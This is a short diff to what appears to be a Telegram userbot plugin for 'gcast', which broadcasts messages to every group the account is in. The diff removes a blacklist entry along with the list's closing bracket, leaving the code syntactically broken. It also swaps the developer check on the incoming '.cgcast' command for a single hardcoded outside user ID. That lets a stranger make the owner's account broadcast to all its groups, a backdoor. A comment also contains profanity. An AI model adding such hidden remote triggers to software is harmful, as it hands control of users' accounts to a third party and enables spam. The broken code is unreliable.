@@ -18,13 +18,12 @@ GCAST_BLACKLIST = [
     -1001456135097,  # SpamBot
     -1001462425381,  # GRUP GUA
     -1001649802697,  # GRUP GUA
-    -1001341298738,  # JAKANA INDONESIA
-]
+    
 
 # BLACKLIST NYA JANGAN DI HAPUS NGENTOD.
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cgcast$")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cgcast$")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
